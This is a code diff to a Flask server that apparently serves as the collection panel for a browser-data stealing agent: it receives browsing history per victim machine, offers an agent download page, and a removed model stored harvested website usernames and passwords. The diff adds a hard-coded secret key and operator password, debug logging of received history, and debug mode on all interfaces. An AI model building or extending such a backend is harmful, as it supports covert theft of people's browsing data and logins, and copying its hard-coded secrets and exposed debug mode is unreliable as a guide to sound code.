@@ -1,9 +1,13 @@
-from flask import Flask, request, jsonify, render_template, send_from_directory
+from flask import Flask, request, jsonify, render_template, send_from_directory, session, url_for, redirect
 from flask_sqlalchemy import SQLAlchemy
 from datetime import datetime, timedelta
 import os
+import secrets
 
 app = Flask(__name__)
+app.secret_key = "3dwyQTG3K7PWcnSjxmO42afZpYwLGCGg"
+VALID_USERNAME = "Astarte"
+VALID_PASSWORD = "BlueSky_5"
 
 BASE_DIR = os.path.dirname(os.path.abspath(__file__))
 DB_PATH = os.path.join(BASE_DIR, 'hosts.db')
@@ -31,22 +35,30 @@ class History(db.Model):
     visit_time = db.Column(db.String(128))
     browser_type = db.Column(db.String(16))
 
-class Credential(db.Model):
-    id = db.Column(db.Integer, primary_key=True)
-    machine_id = db.Column(db.String(64), db.ForeignKey('host.machine_id'))
-    website = db.Column(db.String(256))
-    username = db.Column(db.String(128))
-    password = db.Column(db.Text)
-    browser_type = db.Column(db.String(16))
-
 # ========== ROUTES ==========
-@app.route("/")
+@app.route("/", methods=["GET", "POST"])
 def login():
+    if request.method == "POST":
+        username = request.form.get("username", "")
+        password = request.form.get("password", "")
+        if username == VALID_USERNAME and password == VALID_PASSWORD:
+            session["logged_in"] = True
+            return redirect(url_for("dashboard"))
+        return redirect(url_for("login", error="Invalid credentials"))
     return render_template("index.html")
+
 
 @app.route("/dashboard")
 def dashboard():
+    if not session.get("logged_in"):
+        return redirect(url_for("login"))
     return render_template("dashboard.html")
+
+@app.route("/logout")
+def logout():
+    session.clear()
+    return redirect(url_for("login"))
+
 
 @app.route("/about")
 def about():
@@ -127,8 +139,13 @@ def receive_history():
     data = request.get_json()
     machine_id = data.get("machine_id")
     entries = data.get("history", [])
+
+    print(f"[DEBUG] Received {len(entries)} history items from {machine_id}")
+
     for item in entries:
+        print(f"[DEBUG] Saving: {item}")
         db.session.add(History(machine_id=machine_id, **item))
+
     db.session.commit()
     return jsonify({"status": "ok", "count": len(entries)})
 
@@ -150,8 +167,13 @@ def download_agent_page():
 def download_file(filename):
     return send_from_directory(app.config['UPLOAD_FOLDER'], filename, as_attachment=True)
 
+@app.after_request
+def add_header(response):
+    response.headers['Cache-Control'] = 'no-store'
+    return response
+
 # ========== ENTRY ==========
 if __name__ == "__main__":
     with app.app_context():
         db.create_all()
-    app.run(host="0.0.0.0", port=5000)
+    app.run(host="0.0.0.0", port=5000, debug=True)
